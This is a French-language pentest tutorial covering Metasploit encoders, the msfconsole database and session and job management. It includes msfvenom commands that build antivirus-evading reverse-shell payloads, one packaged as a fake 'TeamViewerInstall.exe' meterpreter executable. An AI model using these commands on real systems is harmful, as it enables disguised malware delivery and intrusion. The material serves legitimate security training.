# Encoders / DATABASE / SESSION

## <mark style="color:red;">**Encoders dans Metasploit**</mark>

Les encoders sont utilisés pour transformer les charges utiles (payloads) dans le cadre des tests de pénétration et des attaques, afin de les rendre compatibles avec différentes architectures de processeur et d'aider à l'évasion des antivirus. Ils sont particulièrement utiles pour :

* Adapter les payloads aux différentes architectures (x64, x86, sparc, ppc, mips).
* Supprimer les caractères hexadécimaux appelés "bad characters" des payloads.
* Encoder les payloads dans différents formats pour contourner la détection par les antivirus (bien que cette utilisation ait diminué avec l'amélioration des protections).

<mark style="color:green;">**Exemple d'Encoder populaire : Shikata Ga Nai**</mark>

**Shikata Ga Nai** (仕方がない), signifiant "Cela ne peut être aidé" ou "Rien n'y fait", est l'un des encoders les plus utilisés dans Metasploit. Bien que son efficacité ait diminué avec le temps, il reste un choix populaire pour encoder des payloads et les rendre plus difficiles à détecter.

**Caractéristiques de Shikata Ga Nai :**

* Encoder polymorphe utilisant une technique XOR additive avec rétroaction.
* Très utilisé dans les attaques par reverse shell.
* Nécessite plusieurs itérations pour obtenir des résultats satisfaisants.

<mark style="color:green;">**Exemple de commande :**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
{% endcode %}

Cela génère un payload encodé à l'aide de Shikata Ga Nai, prêt à être envoyé à la cible.

**Sélection d'un Encoder**

Avant 2015, Metasploit utilisait des scripts séparés comme `msfpayload` et `msfencode`. Aujourd'hui, avec `msfvenom`, la génération de payloads et leur encodage sont réalisés en une seule étape.

<mark style="color:green;">**Exemple avec**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`msfvenom`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**:**</mark>

Sans encodage :

{% code fullWidth="true" %}
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
{% endcode %}

Avec encodage (Shikata Ga Nai) :

{% code overflow="wrap" fullWidth="true" %}
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
{% endcode %}

<mark style="color:green;">**Commandes utiles dans msfconsole**</mark>

Lorsque vous êtes dans `msfconsole`, vous pouvez utiliser la commande `show encoders` pour afficher les encoders compatibles avec le module d'exploitation et le payload choisis.

**Exemple :**

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```

Cela affiche les encoders compatibles avec le module d'exploitation sélectionné.

<mark style="color:green;">**Sélectionner un Encoder spécifique**</mark>

Lors de la sélection d'un encoder, plusieurs options sont disponibles selon l'architecture cible. Par exemple, si vous utilisez une architecture x64, vous trouverez des encoders comme `x64/xor` ou `x64/xor_dynamic`.

<mark style="color:green;">**Exemple d'encoders disponibles pour x86 :**</mark>

* `x86/shikata_ga_nai` : Encoder polymorphe XOR avec rétroaction.
* `x86/countdown` : Encoder XOR avec un compte à rebours.
* `x86/jmp_call_additive` : Encoder XOR avec retour d'ajout.

<mark style="color:green;">**Impact des Encoders sur la détection par les antivirus**</mark>

Bien que l'encodage puisse rendre la détection plus difficile, les antivirus modernes ont amélioré leur capacité à détecter les techniques utilisées par des encoders comme Shikata Ga Nai. Par conséquent, un seul encodage ne garantit pas que le payload passera inaperçu.

<mark style="color:green;">**Amélioration de l'évasion avec des itérations multiples**</mark>

Pour augmenter les chances de contourner les détections, vous pouvez appliquer plusieurs itérations du même encoder. Par exemple, utiliser 10 itérations de Shikata Ga Nai :

{% code overflow="wrap" fullWidth="true" %}
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o TeamViewerInstall.exe
```
{% endcode %}

Cela génère un payload qui passe par 10 itérations d'encodage, augmentant ainsi les chances d'évasion.

***

## <mark style="color:red;">Utilisation des Bases de Données dans MSFConsole</mark>

<mark style="color:green;">**Introduction**</mark>

Les bases de données dans **msfconsole** permettent de suivre et organiser les résultats des tests d'évaluation, en particulier lors des analyses de machines complexes ou de réseaux entiers. Elles offrent un moyen efficace de gérer les informations issues des scans, des points d'entrée, des problèmes détectés, des identifiants découverts, etc. **msfconsole** utilise **PostgreSQL** comme système de base de données pour cette gestion.

**1. Vérification du statut de PostgreSQL**

Avant d'utiliser les bases de données dans **msfconsole**, il est essentiel de s'assurer que le service PostgreSQL est en cours d'exécution. Utilisez la commande suivante pour vérifier le statut :

```bash
sudo service postgresql status
```

**2. Démarrer PostgreSQL**

Si PostgreSQL n'est pas démarré, lancez-le avec :

```bash
sudo systemctl start postgresql
```

**3. Initialiser la base de données MSF**

Pour configurer la base de données pour Metasploit, utilisez la commande suivante :

```bash
sudo msfdb init
```

Si Metasploit n'est pas à jour, il peut y avoir une erreur. Il est recommandé de mettre à jour Metasploit avec `apt update` pour résoudre ce problème.

**4. Vérifier le statut de la base de données**

Une fois la base de données initialisée, vous pouvez vérifier son statut :

```bash
sudo msfdb status
```

**5. Lancer MSFConsole avec la base de données**

Après avoir configuré la base de données, lancez **msfconsole** et connectez-le à la base de données :

```bash
sudo msfdb run
```

**6. Réinitialiser la base de données**

Si nécessaire, vous pouvez réinitialiser la base de données avec les commandes suivantes :

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

**7. Commandes de base de données dans msfconsole**

Voici une liste des commandes pour interagir avec la base de données dans **msfconsole** :

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Commande</strong></td><td><strong>Description</strong></td></tr><tr><td><code>db_connect</code></td><td>Se connecter à une base de données existante.</td></tr><tr><td><code>db_disconnect</code></td><td>Se déconnecter de la base de données actuelle.</td></tr><tr><td><code>db_export</code></td><td>Exporter les résultats de la base de données dans un fichier.</td></tr><tr><td><code>db_import</code></td><td>Importer les résultats d'un fichier de scan.</td></tr><tr><td><code>db_nmap</code></td><td>Exécuter Nmap et enregistrer automatiquement les résultats.</td></tr><tr><td><code>db_rebuild_cache</code></td><td>Reconstruire le cache des modules stockés dans la base de données.</td></tr><tr><td><code>db_status</code></td><td>Afficher l'état actuel de la base de données.</td></tr><tr><td><code>hosts</code></td><td>Lister tous les hôtes dans la base de données.</td></tr><tr><td><code>loot</code></td><td>Lister tous les loot (données récoltées) dans la base de données.</td></tr><tr><td><code>notes</code></td><td>Lister toutes les notes dans la base de données.</td></tr><tr><td><code>services</code></td><td>Lister tous les services dans la base de données.</td></tr><tr><td><code>vulns</code></td><td>Lister toutes les vulnérabilités dans la base de données.</td></tr><tr><td><code>workspace</code></td><td>Gérer les espaces de travail dans la base de données.</td></tr></tbody></table>

**8. Utilisation des Workspaces**

Les **workspaces** permettent d'organiser les résultats dans des "dossiers" pour mieux gérer les informations par IP, sous-réseau, ou domaine.

<table data-header-hidden data-full-width="true"><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>Commande</strong></td><td><strong>Description</strong></td></tr><tr><td><code>workspace</code></td><td>Lister tous les workspaces.</td></tr><tr><td><code>workspace -a [nom]</code></td><td>Ajouter un workspace.</td></tr><tr><td><code>workspace -d [nom]</code></td><td>Supprimer un workspace.</td></tr><tr><td><code>workspace -r</code></td><td>Renommer un workspace.</td></tr><tr><td><code>workspace -v</code></td><td>Lister les workspaces de manière détaillée.</td></tr><tr><td><code>workspace [nom]</code></td><td>Changer de workspace.</td></tr></tbody></table>

**9. Importer des Résultats de Scan**

Pour importer un fichier de résultats d'un scan, comme un scan Nmap, utilisez la commande `db_import`. Exemple avec un fichier `Target.xml` :

```bash
db_import Target.xml
```

Cela ajoutera les informations de l'hôte à la base de données. Vous pouvez ensuite utiliser les commandes `hosts` et `services` pour consulter les résultats importés.

**10. Exemple de Scan Nmap**

Exemple d'un scan Nmap importé avec `db_import` :

```bash
Starting Nmap 7.80 at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
PORT     STATE SERVICE        VERSION
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds
...
```

Une fois importé :

```bash
msf6 > hosts
```

**11. Gestion des Données Importées**

Vous pouvez afficher et gérer les données importées avec les commandes suivantes :

* **Lister les hôtes** :

```bash
hosts
```

* **Lister les services** :

```bash
services
```

* **Lister les vulnérabilités** :

```bash
vulns
```

***

## <mark style="color:red;">**Sessions dans Metasploit**</mark>

<mark style="color:green;">**Introduction aux Sessions**</mark>

Metasploit permet de gérer plusieurs modules en même temps grâce aux **Sessions**, qui créent des interfaces de contrôle dédiées pour chaque module déployé. Une session permet de maintenir une communication stable avec la cible et de gérer l'exécution de plusieurs modules simultanément.

Une session peut être mise en arrière-plan, et la connexion avec l'hôte cible persiste. Toutefois, la session peut se terminer si quelque chose échoue durant l'exécution du payload.

***

#### <mark style="color:green;">**Utilisation des Sessions**</mark>

* **Arrière-plan d'une session :**\
  Lors de l'exécution d'un exploit ou d'un module auxiliaire, vous pouvez envoyer la session en arrière-plan tout en maintenant la communication avec la cible.\
  **Méthodes :**
  * En appuyant sur `[CTRL] + [Z]`
  * En utilisant la commande `background`.
* **Retour au prompt :**\
  Après avoir envoyé une session en arrière-plan, vous pouvez revenir au prompt de `msfconsole` et exécuter un autre module.

***

#### <mark style="color:green;">**Lister les Sessions Actives**</mark>

Pour voir toutes les sessions actives, vous utilisez la commande :

```bash
sessions
```

Cela affichera une liste des sessions avec des informations comme l'ID, le type de session, l'information sur l'utilisateur et la connexion.

**Exemple :**

```bash
msf6 exploit(windows/smb/psexec_psh) > sessions
Active sessions
===============

Id  Name  Type                     Information                  Connection
--  ----  ----                     -----------                  ----------
1        meterpreter x86/windows   NT AUTHORITY\SYSTEM @ MS01   10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

***

#### <mark style="color:green;">**Interagir avec une Session**</mark>

Pour interagir avec une session spécifique, utilisez la commande :

```bash
sessions -i [ID]
```

Exemple pour interagir avec la session `1` :

```bash
bamsf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

Cela permet d'exécuter des modules supplémentaires sur un système déjà compromis.

***

### <mark style="color:blue;">**Les Jobs**</mark>

Les **jobs** sont des tâches qui s'exécutent en arrière-plan. Par exemple, si un exploit est en cours d'exécution et que vous devez libérer un port pour un autre module, vous devez gérer les jobs.

**Commandes pour gérer les jobs :**

*   **Lister les jobs actifs** :

    ```bash
    jobs
    ```
*   **Afficher l'aide des jobs** :

    ```bash
    jobs -h
    ```
*   **Exemple d'affichage des options d'un job** :

    ```bash
    jobs -h
    Usage: jobs [options]

    Active job manipulation and interaction.

    OPTIONS:

        -K        Terminate all running jobs.
        -P        Persist all running jobs on restart.
        -S <opt>  Row search filter.
        -h        Help banner.
        -i <opt>  Lists detailed information about a running job.
        -k <opt>  Terminate jobs by job ID and/or range.
        -l        List all running jobs.
        -p <opt>  Add persistence to job by job ID
        -v        Print more detailed info.  Use with -i and -l
    ```
* **Terminer un job spécifique** :\
  Utilisez `jobs -k [ID]` pour tuer un job spécifique. Vous pouvez aussi utiliser `jobs -K` pour tuer tous les jobs en cours.

***

#### <mark style="color:green;">**Exécution d'un Exploit en Arrière-Plan**</mark>

Lorsque vous lancez un exploit, vous pouvez l'exécuter comme un job en utilisant l'option `-j` :

```bash
exploit -j
```

Cela lance l'exploit en tant que job en arrière-plan. Par exemple :

```bash
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

***

#### <mark style="color:green;">**Lister et Gérer les Jobs**</mark>

*   **Lister les jobs actifs** :

    ```bash
    jobs -l
    ```

    Exemple de sortie :

    ```bash
    Jobs
    ====
    Id  Name                    Payload                    Payload opts
    --  ----                    -------                    ------------
    0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
    ```
* **Tuer un job spécifique** :\
  Utilisez la commande `kill [ID]` pour tuer un job spécifique.
*   **Tuer tous les jobs** :

    ```bash
    jobs -K
    ```

***

#### **Résumé**

* **Sessions** : Elles permettent de gérer plusieurs modules simultanément tout en maintenant la communication avec les cibles.
* **Interagir avec une session** : Vous pouvez entrer dans une session avec `sessions -i [ID]` et exécuter des modules supplémentaires.
* **Jobs** : Ils permettent d'exécuter des tâches en arrière-plan. Utilisez les commandes `jobs`, `jobs -l`, `jobs -K`, et `jobs -k [ID]` pour gérer les jobs.
